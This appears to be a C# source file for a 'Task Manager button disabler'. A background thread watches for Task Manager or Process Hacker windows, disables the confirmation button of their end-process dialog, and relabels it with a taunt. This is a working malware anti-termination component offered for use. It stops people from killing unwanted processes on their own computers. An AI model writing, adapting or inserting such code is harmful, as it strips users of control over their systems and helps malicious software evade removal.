using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;

namespace TaskManager_Button_Disabler
{
    public class TBD
    {
        #region "Config"

        readonly string[] _processes = { "taskmgr", "processhacker", "proccess explorer" };
        static string _newMsg = "NO BOII";

        #endregion

        enum _threadStatus
        {
            Run = 0,
            Stop = 1,
        };

        _threadStatus atualStatus = _threadStatus.Stop;

        List<IntPtr> _cld = new List<IntPtr>();

        public TBD()
        {
            new Thread(DFunction) { IsBackground = true }.Start();
        }

        /// <summary>
        /// Start button disabler
        /// </summary>
        public void Start()
        {
            atualStatus = _threadStatus.Run;
        }

        /// <summary>
        /// Stop button disabler
        /// </summary>
        public void Stop()
        {
            atualStatus = _threadStatus.Stop;
        }

        void DFunction()
        {
            while (true)
            {
                //Wait on status to be true
                while (atualStatus == _threadStatus.Run)
                {
                    //Pause for few ms to avoid cpu consumption
                    Thread.Sleep(200);

                    //If actual window is not in foreground then continue
                    IntPtr hwd = NativeApi.GetForegroundWindow();
                    if (hwd.ToInt32() == 0)
                        continue;


                    var id = 0;
                    //Get process id by window handle (hwd)
                    NativeApi.GetWindowThreadProcessId(hwd, ref id);

                    //If process does not exist then continue
                    if (id <= 0) continue;

                    //Store process info from id into p
                    Process p = Process.GetProcessById(id);

                    //Check if ProcessName correspond to _processes
                    if (!_processes.Any(x => x == p.ProcessName.ToLower())) continue;
                    {

                        //Create a button list to store handles
                        List<IntPtr> button = new List<IntPtr>();
                        int statics = 0;

                        //Foreach handle(hwd) store to x
                        foreach (var x in GetChild(hwd))
                        {
                            //Get type of handle in className
                            string className = new string(' ', 200);
                            int ln = NativeApi.GetClassName((int)x, ref className, 200);
                            className = className.Remove(ln, 200 - ln);

                            switch (className.ToLower())
                            {
                                //If className(type) is button then add it to button list
                                case "button":
                                    button.Add(x);
                                    break;

                                //If className(type) is static or directuihwnd then increase number of statics var
                                case "static":
                                case "directuihwnd":
                                    ++statics;
                                    break;
                            }
                        }

                        //If window does not have 2 buttons then continue
                        if (button.Count != 2)
                            continue;
                        //If window does not have between 0-2 class named static & directuihwnd then continue
                        else if (!(statics > 0 && statics < 3))
                            continue;

                        //Finally the funny part, disable button and change text to _newMsg
                        NativeApi.EnableWindow(button[0], false);
                        NativeApi.SendMessage((int)button[0], 12, 0, ref _newMsg);

                        //Watermark ma bruda 😋
                        string watermark = "by Mrakovic";
                        NativeApi.SendMessage((int)button[1], 12, 0, ref watermark);
                    }
                }
            }
        }

        /// <summary>
        ///  Get child windows of an process
        /// </summary>
        bool EnumChild(int hWnd, int lParam)
        {
            _cld.Add((IntPtr)hWnd);
            return true;
        }

        IEnumerable<IntPtr> GetChild(IntPtr hwd)
        {
            bool flag = false;
            IntPtr[] getChild;
            try
            {
                Monitor.Enter(this, ref flag);
                _cld.Clear();
                NativeApi.EnumWindProc lpEnumFunc = EnumChild;
                int num = 0;
                NativeApi.EnumChildWindows(hwd, lpEnumFunc, ref num);
                getChild = _cld.ToArray();
            }
            finally
            {
                var flag2 = flag;
                if (flag2)
                {
                    Monitor.Exit(this);
                }
            }

            return getChild;
        }
    }
}
